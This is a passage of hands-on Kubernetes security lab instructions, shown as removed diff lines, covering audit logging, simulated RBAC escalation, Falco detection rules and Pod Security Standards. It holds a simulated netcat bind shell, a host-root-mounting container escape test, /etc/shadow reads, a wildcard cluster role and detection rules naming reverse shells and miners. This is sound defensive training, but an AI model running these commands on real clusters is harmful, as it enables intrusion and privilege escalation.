-      mountPath: /var/log/kubernetes/audit
-      readOnly: false
-  volumes:
-  - name: audit-policy
-    hostPath:
-      path: /etc/kubernetes/audit
-      type: DirectoryOrCreate
-  - name: audit-log
-    hostPath:
-      path: /var/log/kubernetes/audit
-      type: DirectoryOrCreate
-EOF
-
-# Apply the patch to enable audit logging
-sudo python3 -c "
-import yaml
-import sys
-
-# Read the original file
-with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'r') as f:
-    original = yaml.safe_load(f)
-
-# Add audit parameters to command
-audit_flags = [
-    '--audit-log-path=/var/log/kubernetes/audit/audit.log',
-    '--audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml',
-    '--audit-log-maxage=30',
-    '--audit-log-maxbackup=3',
-    '--audit-log-maxsize=100'
-]
-
-for flag in audit_flags:
-    if flag not in original['spec']['containers'][0]['command']:
-        original['spec']['containers'][0]['command'].append(flag)
-
-# Add volume mounts
-volume_mounts = [
-    {'name': 'audit-policy', 'mountPath': '/etc/kubernetes/audit', 'readOnly': True},
-    {'name': 'audit-log', 'mountPath': '/var/log/kubernetes/audit', 'readOnly': False}
-]
-
-if 'volumeMounts' not in original['spec']['containers'][0]:
-    original['spec']['containers'][0]['volumeMounts'] = []
-
-for vm in volume_mounts:
-    if not any(existing['name'] == vm['name'] for existing in original['spec']['containers'][0]['volumeMounts']):
-        original['spec']['containers'][0]['volumeMounts'].append(vm)
-
-# Add volumes
-volumes = [
-    {'name': 'audit-policy', 'hostPath': {'path': '/etc/kubernetes/audit', 'type': 'DirectoryOrCreate'}},
-    {'name': 'audit-log', 'hostPath': {'path': '/var/log/kubernetes/audit', 'type': 'DirectoryOrCreate'}}
-]
-
-if 'volumes' not in original['spec']:
-    original['spec']['volumes'] = []
-
-for vol in volumes:
-    if not any(existing['name'] == vol['name'] for existing in original['spec']['volumes']):
-        original['spec']['volumes'].append(vol)
-
-# Write back the modified file
-with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'w') as f:
-    yaml.dump(original, f, default_flow_style=False)
-"
-
-Subtask 1.4: Wait for API Server Restart
-
-# Wait for the API server to restart (this may take a few minutes)
-echo "Waiting for API server to restart with audit logging enabled..."
-sleep 60
-
-# Check if the API server is running
-kubectl get nodes
-
-# Verify audit logging is working
-echo "Checking if audit log file is created..."
-sudo ls -la /var/log/kubernetes/audit/
-
-Subtask 1.5: Deploy Fluent Bit as Log Agent
-
-Now let's deploy Fluent Bit to collect and forward our audit logs.
-
-# Create namespace for logging
-kubectl create namespace logging
-
-# Create Fluent Bit configuration
-kubectl create configmap fluent-bit-config -n logging --from-literal=fluent-bit.conf="
-[SERVICE]
-    Flush         1
-    Log_Level     info
-    Daemon        off
-    Parsers_File  parsers.conf
-
-[INPUT]
-    Name              tail
-    Path              /var/log/kubernetes/audit/audit.log
-    Parser            json
-    Tag               kube.audit
-    Refresh_Interval  5
-    Mem_Buf_Limit     50MB
-    Skip_Long_Lines   On
-
-[OUTPUT]
-    Name  stdout
-    Match *
-    Format json_lines
-"
-
-# Create Fluent Bit DaemonSet
-kubectl apply -f - <<EOF
-apiVersion: apps/v1
-kind: DaemonSet
-metadata:
-  name: fluent-bit
-  namespace: logging
-  labels:
-    k8s-app: fluent-bit-logging
-spec:
-  selector:
-    matchLabels:
-      name: fluent-bit
-  template:
-    metadata:
-      labels:
-        name: fluent-bit
-    spec:
-      serviceAccount: fluent-bit
-      serviceAccountName: fluent-bit
-      tolerations:
-      - key: node-role.kubernetes.io/master
-        operator: Exists
-        effect: NoSchedule
-      containers:
-      - name: fluent-bit
-        image: fluent/fluent-bit:2.1.10
-        imagePullPolicy: Always
-        ports:
-          - containerPort: 2020
-        volumeMounts:
-        - name: varlog
-          mountPath: /var/log
-        - name: fluent-bit-config
-          mountPath: /fluent-bit/etc/
-      terminationGracePeriodSeconds: 10
-      volumes:
-      - name: varlog
-        hostPath:
-          path: /var/log
-      - name: fluent-bit-config
-        configMap:
-          name: fluent-bit-config
----
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: fluent-bit
-  namespace: logging
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRole
-metadata:
-  name: fluent-bit-read
-rules:
-- apiGroups: [""]
-  resources:
-  - namespaces
-  - pods
-  verbs: ["get", "list", "watch"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: fluent-bit-read
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: fluent-bit-read
-subjects:
-- kind: ServiceAccount
-  name: fluent-bit
-  namespace: logging
-EOF
-
-Subtask 1.6: Verify Log Agent Deployment
-
-# Check if Fluent Bit is running
-kubectl get pods -n logging
-
-# Wait for the pod to be ready
-kubectl wait --for=condition=ready pod -l name=fluent-bit -n logging --timeout=300s
-
-# Check Fluent Bit logs
-kubectl logs -n logging -l name=fluent-bit --tail=20
-
-Task 2: Simulate Privilege Escalation Attempt and Analyze Logs
-Subtask 2.1: Create a Test Namespace and Service Account
-
-# Create a test namespace
-kubectl create namespace security-test
-
-# Create a service account with limited permissions
-kubectl create serviceaccount test-user -n security-test
-
-# Create a role with basic permissions
-kubectl apply -f - <<EOF
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: security-test
-  name: pod-reader
-rules:
-- apiGroups: [""]
-  resources: ["pods"]
-  verbs: ["get", "watch", "list"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: read-pods
-  namespace: security-test
-subjects:
-- kind: ServiceAccount
-  name: test-user
-  namespace: security-test
-roleRef:
-  kind: Role
-  name: pod-reader
-  apiGroup: rbac.authorization.k8s.io
-EOF
-
-Subtask 2.2: Deploy a Test Pod
-
-# Create a test pod that will attempt privilege escalation
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Pod
-metadata:
-  name: privilege-escalation-test
-  namespace: security-test
-spec:
-  serviceAccountName: test-user
-  containers:
-  - name: test-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      runAsUser: 1000
-      runAsGroup: 1000
-      allowPrivilegeEscalation: false
-      capabilities:
-        drop:
-        - ALL
-      readOnlyRootFilesystem: false
-EOF
-
-Subtask 2.3: Simulate Privilege Escalation Attempts
-
-# Wait for the pod to be ready
-kubectl wait --for=condition=ready pod/privilege-escalation-test -n security-test --timeout=300s
-
-# Attempt 1: Try to access secrets (should fail)
-echo "Attempting to access secrets..."
-kubectl auth can-i get secrets --as=system:serviceaccount:security-test:test-user -n security-test
-
-# Attempt 2: Try to create privileged resources
-echo "Attempting to create cluster roles..."
-kubectl apply -f - <<EOF
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRole
-metadata:
-  name: malicious-cluster-role
-rules:
-- apiGroups: ["*"]
-  resources: ["*"]
-  verbs: ["*"]
-EOF
-
-# Attempt 3: Try to access kube-system namespace
-echo "Attempting to list pods in kube-system..."
-kubectl get pods -n kube-system --as=system:serviceaccount:security-test:test-user
-
-# Attempt 4: Try to modify existing resources
-echo "Attempting to patch deployment..."
-kubectl patch deployment coredns -n kube-system -p '{"spec":{"replicas":1}}' --as=system:serviceaccount:security-test:test-user
-
-# Generate some legitimate activity for comparison
-echo "Generating legitimate activity..."
-kubectl get pods -n security-test --as=system:serviceaccount:security-test:test-user
-kubectl describe pod privilege-escalation-test -n security-test --as=system:serviceaccount:security-test:test-user
-
-Subtask 2.4: Analyze Audit Logs
-
-# Wait a moment for logs to be written
-sleep 30
-
-# Check recent audit log entries
-echo "=== Recent Audit Log Entries ==="
-sudo tail -20 /var/log/kubernetes/audit/audit.log | jq '.'
-
-# Look for failed authorization attempts
-echo "=== Failed Authorization Attempts ==="
-sudo grep -i "forbidden\|unauthorized" /var/log/kubernetes/audit/audit.log | tail -10 | jq '.'
-
-# Look for privilege escalation attempts
-echo "=== Privilege Escalation Attempts ==="
-sudo grep -i "clusterrole\|secrets" /var/log/kubernetes/audit/audit.log | tail -5 | jq '.'
-
-# Analyze user activities
-echo "=== Activities by test-user ==="
-sudo grep "system:serviceaccount:security-test:test-user" /var/log/kubernetes/audit/audit.log | tail -10 | jq '.user.username, .verb, .objectRef.resource, .responseStatus.code'
-
-Subtask 2.5: Create Log Analysis Script
-
-# Create a script to analyze suspicious activities
-cat > analyze_audit_logs.sh << 'EOF'
-#!/bin/bash
-
-AUDIT_LOG="/var/log/kubernetes/audit/audit.log"
-
-echo "=== Kubernetes Audit Log Analysis ==="
-echo "Analyzing log file: $AUDIT_LOG"
-echo
-
-# Check if audit log exists
-if [ ! -f "$AUDIT_LOG" ]; then
-    echo "Audit log file not found!"
-    exit 1
-fi
-
-echo "1. Failed Authentication/Authorization Attempts:"
-echo "================================================"
-sudo grep -i "forbidden\|unauthorized\|authentication failed" "$AUDIT_LOG" | \
-    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Action: \(.verb) \(.objectRef.resource // .requestURI) - Status: \(.responseStatus.code)"' | \
-    tail -10
-
-echo
-echo "2. Privilege Escalation Indicators:"
-echo "=================================="
-sudo grep -E "(clusterrole|clusterrolebinding|secrets|serviceaccounts/token)" "$AUDIT_LOG" | \
-    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Action: \(.verb) \(.objectRef.resource) - Status: \(.responseStatus.code)"' | \
-    tail -10
-
-echo
-echo "3. Suspicious Resource Access:"
-echo "============================="
-sudo grep -E "(kube-system|kube-public)" "$AUDIT_LOG" | \
-    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Namespace: \(.objectRef.namespace) - Action: \(.verb) \(.objectRef.resource)"' | \
-    tail -10
-
-echo
-echo "4. Summary Statistics:"
-echo "===================="
-echo "Total audit entries: $(sudo wc -l < "$AUDIT_LOG")"
-echo "Failed requests: $(sudo grep -c '"code":403\|"code":401' "$AUDIT_LOG")"
-echo "Successful requests: $(sudo grep -c '"code":200\|"code":201' "$AUDIT_LOG")"
-
-EOF
-
-chmod +x analyze_audit_logs.sh
-./analyze_audit_logs.sh
-
-Task 3: Use Falco to Detect Runtime Anomalies
-Subtask 3.1: Install Falco
-
-# Add Falco repository
-curl -s https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add -
-echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list
-
-# Update package list and install Falco
-sudo apt-get update -y
-sudo apt-get install -y falco
-
-# Check Falco version
-falco --version
-
-Subtask 3.2: Configure Falco for Kubernetes
-
-# Create Falco configuration for Kubernetes
-sudo tee /etc/falco/falco_rules.local.yaml > /dev/null <<EOF
-# Custom rules for Kubernetes security monitoring
-
-- rule: Detect Privilege Escalation
-  desc: Detect attempts to escalate privileges
-  condition: >
-    k8s_audit and
-    ka.verb in (create, update, patch) and
-    ka.target.resource in (clusterroles, clusterrolebindings, roles, rolebindings) and
-    ka.response_code >= 200 and ka.response_code < 300
-  output: >
-    Privilege escalation detected (user=%ka.user.name verb=%ka.verb 
-    resource=%ka.target.resource reason=%ka.response_reason)
-  priority: WARNING
-  tags: [k8s, rbac, privilege_escalation]
-
-- rule: Detect Secret Access
-  desc: Detect unauthorized access to secrets
-  condition: >
-    k8s_audit and
-    ka.verb in (get, list, watch) and
-    ka.target.resource=secrets and
-    ka.response_code >= 200 and ka.response_code < 300
-  output: >
-    Secret access detected (user=%ka.user.name verb=%ka.verb 
-    secret=%ka.target.name namespace=%ka.target.namespace)
-  priority: WARNING
-  tags: [k8s, secrets]
-
-- rule: Detect Suspicious Container Activity
-  desc: Detect suspicious activities in containers
-  condition: >
-    spawned_process and
-    container and
-    proc.name in (nc, netcat, ncat, nmap, dig, nslookup, tcpdump)
-  output: >
-    Suspicious network tool executed in container (user=%user.name 
-    command=%proc.cmdline container=%container.name image=%container.image.repository)
-  priority: WARNING
-  tags: [container, network, suspicious]
-
-- rule: Detect File System Changes in Containers
-  desc: Detect unauthorized file system modifications
-  condition: >
-    open_write and
-    container and
-    fd.typechar='f' and
-    fd.name startswith /etc
-  output: >
-    File modification in sensitive directory (user=%user.name 
-    file=%fd.name container=%container.name command=%proc.cmdline)
-  priority: WARNING
-  tags: [filesystem, container]
-EOF
-
-Subtask 3.3: Deploy Falco in Kubernetes
-
-# Create Falco namespace
-kubectl create namespace falco
-
-# Deploy Falco using Helm (install Helm first if not available)
-curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
-
-# Add Falco Helm repository
-helm repo add falcosecurity https://falcosecurity.github.io/charts
-helm repo update
-
-# Install Falco
-helm install falco falcosecurity/falco \
-  --namespace falco \
-  --set falco.grpc.enabled=true \
-  --set falco.grpcOutput.enabled=true \
-  --set auditLog.enabled=true \
-  --set auditLog.dynamicBackend.enabled=true
-
-# Wait for Falco to be ready
-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=falco -n falco --timeout=300s
-
-Subtask 3.4: Alternative Falco Deployment (if Helm fails)
-
-# If Helm installation fails, deploy Falco manually
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: falco
-  namespace: falco
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRole
-metadata:
-  name: falco
-rules:
-- apiGroups: [""]
-  resources: ["nodes", "namespaces", "pods", "replicationcontrollers", "services", "events"]
-  verbs: ["get", "list", "watch"]
-- apiGroups: ["apps"]
-  resources: ["daemonsets", "deployments", "replicasets", "statefulsets"]
-  verbs: ["get", "list", "watch"]
-- apiGroups: ["extensions"]
-  resources: ["daemonsets", "deployments", "replicasets"]
-  verbs: ["get", "list", "watch"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: falco
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: falco
-subjects:
-- kind: ServiceAccount
-  name: falco
-  namespace: falco
----
-apiVersion: apps/v1
-kind: DaemonSet
-metadata:
-  name: falco
-  namespace: falco
-spec:
-  selector:
-    matchLabels:
-      app: falco
-  template:
-    metadata:
-      labels:
-        app: falco
-    spec:
-      serviceAccount: falco
-      hostNetwork: true
-      hostPID: true
-      containers:
-      - name: falco
-        image: falcosecurity/falco:0.36.2
-        securityContext:
-          privileged: true
-        args:
-          - /usr/bin/falco
-          - --cri=/run/containerd/containerd.sock
-          - --k8s-api
-          - --k8s-api-cert=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          - --k8s-api-token=/var/run/secrets/kubernetes.io/serviceaccount/token
-        volumeMounts:
-        - mountPath: /host/var/run/docker.sock
-          name: docker-socket
-        - mountPath: /host/run/containerd/containerd.sock
-          name: containerd-socket
-        - mountPath: /host/dev
-          name: dev-fs
-        - mountPath: /host/proc
-          name: proc-fs
-          readOnly: true
-        - mountPath: /host/boot
-          name: boot-fs
-          readOnly: true
-        - mountPath: /host/lib/modules
-          name: lib-modules
-          readOnly: true
-        - mountPath: /host/usr
-          name: usr-fs
-          readOnly: true
-        - mountPath: /host/etc
-          name: etc-fs
-          readOnly: true
-      volumes:
-      - name: docker-socket
-        hostPath:
-          path: /var/run/docker.sock
-      - name: containerd-socket
-        hostPath:
-          path: /run/containerd/containerd.sock
-      - name: dev-fs
-        hostPath:
-          path: /dev
-      - name: proc-fs
-        hostPath:
-          path: /proc
-      - name: boot-fs
-        hostPath:
-          path: /boot
-      - name: lib-modules
-        hostPath:
-          path: /lib/modules
-      - name: usr-fs
-        hostPath:
-          path: /usr
-      - name: etc-fs
-        hostPath:
-          path: /etc
-      tolerations:
-      - effect: NoSchedule
-        key: node-role.kubernetes.io/master
-EOF
-
-Subtask 3.5: Verify Falco Installation
-
-# Check Falco pods
-kubectl get pods -n falco
-
-# Check Falco logs
-kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
-
-# If using manual deployment
-kubectl logs -n falco -l app=falco --tail=20
-
-Subtask 3.6: Generate Runtime Anomalies for Detection
-
-# Create a pod that will perform suspicious activities
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Pod
-metadata:
-  name: suspicious-pod
-  namespace: security-test
-spec:
-  containers:
-  - name: suspicious-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "apt-get update && apt-get install -y netcat-openbsd && sleep 3600"]
-    securityContext:
-      runAsUser: 0
-      privileged: true
-EOF
-
-# Wait for the pod to be ready
-kubectl wait --for=condition=ready pod/suspicious-pod -n security-test --timeout=300s
-
-# Execute suspicious commands in the container
-echo "Executing suspicious network commands..."
-kubectl exec -it suspicious-pod -n security-test -- /bin/bash -c "
-echo 'Testing network connectivity...'
-nc -l -p 8080 &
-sleep 2
-pkill nc
-echo 'Network test completed'
-"
-
-# Try to modify system files
-echo "Attempting to modify system files..."
-kubectl exec suspicious-pod -n security-test -- /bin/bash -c "
-echo 'test' > /etc/test-file 2>/dev/null || echo 'Failed to write to /etc'
-"
-
-# Access sensitive directories
-echo "Accessing sensitive directories..."
-kubectl exec suspicious-pod -n security-test -- /bin/bash -c "
-ls -la /etc/passwd /etc/shadow 2>/dev/null || echo 'Cannot access sensitive files'
-"
-
-Subtask 3.7: Monitor Falco Alerts
-
-# Monitor Falco alerts in real-time
-echo "Monitoring Falco alerts (press Ctrl+C to stop)..."
-kubectl logs -n falco -l app.kubernetes.io/name=falco -f &
-FALCO_PID=$!
-
-# If using manual deployment
-kubectl logs -n falco -l app=falco -f &
-FALCO_MANUAL_PID=$!
-
-# Wait for a few seconds to capture alerts
-sleep 30
-
-# Stop monitoring
-kill $FALCO_PID 2>/dev/null
-kill $FALCO_MANUAL_PID 2>/dev/null
-
-echo "Falco monitoring stopped."
-
-Subtask 3.8: Analyze Falco Alerts
-
-# Get recent Falco alerts
-echo "=== Recent Falco Alerts ==="
-kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50 | grep -E "(WARNING|ERROR|CRITICAL)" || \
-kubectl logs -n falco -l app=falco --tail=50 | grep -E "(WARNING|ERROR|CRITICAL)"
-
-# Create a script to parse Falco alerts
-cat > parse_falco_alerts.sh << 'EOF'
-#!/bin/bash
-
-echo "=== Falco Alert Analysis ==="
-echo
-
-# Get Falco logs
-FALCO_LOGS=$(kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=100 2>/dev/null || \
-             kubectl logs -n falco -l app=falco --tail=100 2>/dev/null)
-
-if [ -z "$FALCO_LOGS" ]; then
-    echo "No Falco logs found. Falco might not be running properly."
-    exit 1
-fi
-
-echo "1. Security Alerts Summary:"
-echo "=========================="
-echo "$FALCO_LOGS" | grep -c "WARNING" | xargs echo "WARNING alerts:"
-echo "$FALCO_LOGS" | grep -c "ERROR" | xargs echo "ERROR alerts:"
-echo "$FALCO_LOGS" | grep -c "CRITICAL" | xargs echo "CRITICAL alerts:"
-
-echo
-echo "2. Recent Security Events:"
-echo "========================="
-echo "$FALCO_LOGS" | grep -E "(WARNING|ERROR|CRITICAL)" | tail -10
-
-echo
-echo "3. Container-related Alerts:"
-echo "==========================="
-echo "$FALCO_LOGS" | grep -i "container" | tail -5
-
-echo
-echo "4. Network-related Alerts:"
-echo "========================="
-echo "$FALCO_LOGS" | grep -i "network\|netcat\|nc" | tail -5
-
-EOF
-
-chmod +x parse_falco_alerts.sh
-./parse_falco_alerts.sh
-
-Task 4: Advanced Threat Detection and Response
-Subtask 4.1: Create Custom Falco Rules
-
-# Create advanced custom rules
-kubectl create configmap falco-custom-rules -n falco --from-literal=custom_rules.yaml="
-- rule: Detect Cryptocurrency Mining
-  desc: Detect potential cryptocurrency mining activities
-  condition: >
-    spawned_process and
-    container and
-    proc.name in (xmrig, cpuminer, cgminer, bfgminer, ethminer)
-  output: >
-    Cryptocurrency mining detected (user=%user.name command=%proc.cmdline 
-    container=%container.name image=%container.image.repository)
-  priority: CRITICAL
-  tags: [malware, cryptocurrency, mining]
-
-- rule: Detect Reverse Shell
-  desc: Detect potential reverse shell connections
-  condition: >
-    spawned_process and
-    container and
-    ((proc.name=nc and proc.args contains \"-e\") or
-     (proc.name=bash and proc.pname=nc) or
-     (proc.name=sh and proc.pname=nc))
-  output: >
-    Potential reverse shell detected (user=%user.name command=%proc.cmdline 
-    container=%container.name)
-  priority: CRITICAL
-  tags: [attack, reverse_shell]
-
-- rule: Detect Container Escape Attempt
-  desc: Detect attempts to escape from containers
-  condition: >
-    open_write and
-    container and
-    fd.name startswith /host
-  output: >
-    Container escape attempt detected (user=%user.name file=%fd.name 
-    container=%container.name command=%proc.cmdline)
-  priority: CRITICAL
-  tags: [container_escape, privilege_escalation]
-"
-
-Subtask 4.2: Test Advanced Detection
-
-# Create a more sophisticated attack simulation
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Pod
-metadata:
-  name: advanced-threat-test
-  namespace: security-test
-spec:
-  containers:
-  - name: threat-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "sleep 3600"]
-    securityContext:
-      runAsUser: 0
-    volumeMounts:
-    - name: host-root
-      mountPath: /host
-      readOnly: false
-  volumes:
-  - name: host-root
-    hostPath:
-      path: /
-EOF
-
-# Wait for pod to be ready
-kubectl wait --for=condition=ready pod/advanced-threat-test -n security-test --timeout=300s
-
-# Simulate container escape attempt
-echo "Simulating container escape attempt..."
-kubectl exec advanced-threat-test -n security-test -- /bin/bash -c "
-echo 'Attempting to access host filesystem...'
-ls /host/etc/ 2>/dev/null || echo 'Host access failed'
-echo 'test' > /host/tmp/container-escape-test 2>/dev/null || echo 'Write to host failed'
-"
-
-# Simulate reverse shell attempt
-echo "Simulating reverse shell attempt..."
-kubectl exec advanced-threat-test -n security-test -- /bin/bash -c "
-echo 'Simulating reverse shell...'
-nc -l -p 4444 -e /bin/bash &
-sleep 2
-pkill nc
-echo 'Reverse shell simulation completed'
-" 2>/dev/null || echo
-
-
-
-
-
-
-Lab 16: Minimizing Microservice Vulnerabilities
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Deploy applications with the Baseline Pod Security Standard to enforce security policies • Reduce container image attack surface by using minimal base images • Implement application sandboxing using gVisor runtime for enhanced isolation • Understand the security benefits of each approach in microservice architectures • Apply security best practices for container and Kubernetes deployments
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with Docker containers and container images • Knowledge of YAML configuration files • Understanding of Linux command line operations • Basic security concepts related to containers
-Lab Environment
-
-Al Nafi provides you with a pre-configured Linux-based cloud machine with all necessary tools installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.
-
-Your lab environment includes: • Kubernetes cluster (v1.28+) • Docker runtime • kubectl command-line tool • gVisor runtime (runsc) • Text editors (nano, vim)
-Task 1: Deploy Applications with Baseline Pod Security Standard
-Subtask 1.1: Understanding Pod Security Standards
-
-Pod Security Standards define three different policies to broadly cover the security spectrum:
-
-• Privileged: Unrestricted policy, providing the widest possible level of permissions • Baseline: Minimally restrictive policy which prevents known privilege escalations • Restricted: Heavily restricted policy, following current Pod hardening best practices
-Subtask 1.2: Enable Pod Security Standards
-
-First, let's check the current Kubernetes version and create a namespace with Pod Security Standards enabled.
-
-# Check Kubernetes version
-kubectl version --short
-
-# Create a namespace with Baseline Pod Security Standard
-kubectl create namespace secure-microservices
-
-# Label the namespace to enforce Baseline Pod Security Standard
-kubectl label namespace secure-microservices \
-  pod-security.kubernetes.io/enforce=baseline \
-  pod-security.kubernetes.io/audit=baseline \
-  pod-security.kubernetes.io/warn=baseline
-
-Subtask 1.3: Create a Non-Compliant Application
-
-Let's first create an application that violates the Baseline Pod Security Standard to understand what gets blocked.
-
-# Create a non-compliant deployment
-cat << 'EOF' > non-compliant-app.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: non-compliant-app
-  namespace: secure-microservices
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: non-compliant-app
-  template:
-    metadata:
-      labels:
-        app: non-compliant-app
-    spec:
-      containers:
-      - name: app
-        image: nginx:latest
-        securityContext:
-          privileged: true  # This violates Baseline standard
-          runAsUser: 0      # Running as root
-        ports:
-        - containerPort: 80
-EOF
-
-# Try to apply the non-compliant deployment
-kubectl apply -f non-compliant-app.yaml
-
-You should see warnings or errors about policy violations.
-Subtask 1.4: Create a Compliant Application
-
-Now let's create a compliant application that follows the Baseline Pod Security Standard.
-
-# Create a compliant deployment
-cat << 'EOF' > compliant-app.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: compliant-app
-  namespace: secure-microservices
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: compliant-app
-  template:
-    metadata:
-      labels:
-        app: compliant-app
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        runAsGroup: 1000
-        fsGroup: 1000
-      containers:
-      - name: app
-        image: nginx:latest
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1000
-          capabilities:
-            drop:
-            - ALL
-        ports:
-        - containerPort: 8080
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-        - name: var-cache-nginx
-          mountPath: /var/cache/nginx
-        - name: var-run
-          mountPath: /var/run
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      - name: var-cache-nginx
-        emptyDir: {}
-      - name: var-run
-        emptyDir: {}
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: compliant-app-service
-  namespace: secure-microservices
-spec:
-  selector:
-    app: compliant-app
-  ports:
-  - port: 80
-    targetPort: 8080
-  type: ClusterIP
-EOF
-
-# Apply the compliant deployment
-kubectl apply -f compliant-app.yaml
-
-# Check the deployment status
-kubectl get pods -n secure-microservices
-kubectl describe deployment compliant-app -n secure-microservices
-
-Subtask 1.5: Verify Pod Security Compliance
-
-# Check pod security context
-kubectl get pod -n secure-microservices -l app=compliant-app -o yaml | grep -A 10 securityContext
-
-# Verify the pods are running with correct user
-kubectl exec -n secure-microservices deployment/compliant-app -- id
-
-# Check for any security violations in events
-kubectl get events -n secure-microservices --sort-by='.lastTimestamp'
-
-Task 2: Reduce Image Size by Using Minimal Base Images
-Subtask 2.1: Analyze Current Image Size
-
-Let's start by examining the size of a standard base image and then optimize it.
-
-# Pull and examine a standard Ubuntu image
-docker pull ubuntu:latest
-docker images ubuntu:latest
-
-# Pull and examine Alpine Linux (minimal base image)
-docker pull alpine:latest
-docker images alpine:latest
-
-# Compare sizes
-docker images | grep -E "(ubuntu|alpine)"
-
-Subtask 2.2: Create Application with Standard Base Image
-
-First, let's create a simple web application using a standard base image.
-
-# Create a directory for our application
-mkdir -p ~/microservice-app
-cd ~/microservice-app
-
-# Create a simple Python web application
-cat << 'EOF' > app.py
-from flask import Flask, jsonify
-import os
-
-app = Flask(__name__)
-
-@app.route('/')
-def hello():
-    return jsonify({
-        'message': 'Hello from secure microservice!',
-        'hostname': os.environ.get('HOSTNAME', 'unknown'),
-        'version': '1.0'
-    })
-
-@app.route('/health')
-def health():
-    return jsonify({'status': 'healthy'})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
-EOF
-
-# Create requirements file
-cat << 'EOF' > requirements.txt
-Flask==2.3.3
-Werkzeug==2.3.7
-EOF
-
-# Create Dockerfile with standard base image
-cat << 'EOF' > Dockerfile.standard
-FROM python:3.11
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
-COPY app.py .
-EXPOSE 8080
-CMD ["python", "app.py"]
-EOF
-
-# Build the standard image
-docker build -f Dockerfile.standard -t microservice-app:standard .
-
-# Check the image size
-docker images microservice-app:standard
-
-Subtask 2.3: Create Optimized Application with Minimal Base Image
-
-Now let's create the same application using a minimal base image.
-
-# Create optimized Dockerfile using Alpine
-cat << 'EOF' > Dockerfile.alpine
-FROM python:3.11-alpine
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
-COPY app.py .
-RUN addgroup -g 1000 appgroup && \
-    adduser -D -u 1000 -G appgroup appuser && \
-    chown -R appuser:appgroup /app
-USER appuser
-EXPOSE 8080
-CMD ["python", "app.py"]
-EOF
-
-# Build the Alpine-based image
-docker build -f Dockerfile.alpine -t microservice-app:alpine .
-
-# Create an even more minimal distroless image
-cat << 'EOF' > Dockerfile.distroless
-FROM python:3.11-alpine as builder
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt --target /app/packages
-
-FROM gcr.io/distroless/python3
-COPY --from=builder /app/packages /app/packages
-COPY app.py /app/
-WORKDIR /app
-ENV PYTHONPATH=/app/packages
-EXPOSE 8080
-CMD ["app.py"]
-EOF
-
-# Build the distroless image
-docker build -f Dockerfile.distroless -t microservice-app:distroless .
-
-# Compare all image sizes
-echo "Image Size Comparison:"
-docker images | grep microservice-app
-
-Subtask 2.4: Deploy Minimal Image Application
-
-# Create deployment using the minimal Alpine image
-cat << 'EOF' > minimal-app-deployment.yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: minimal-app
-  namespace: secure-microservices
-spec:
-  replicas: 2
-  selector:
-    matchLabels:
-      app: minimal-app
-  template:
-    metadata:
-      labels:
-        app: minimal-app
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1000
-        runAsGroup: 1000
-        fsGroup: 1000
-      containers:
-      - name: app
-        image: microservice-app:alpine
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1000
-          capabilities:
-            drop:
-            - ALL
-        ports:
-        - containerPort: 8080
-        resources:
-          requests:
-            memory: "64Mi"
-            cpu: "50m"
-          limits:
-            memory: "128Mi"
-            cpu: "100m"
-        livenessProbe:
-          httpGet:
-            path: /health
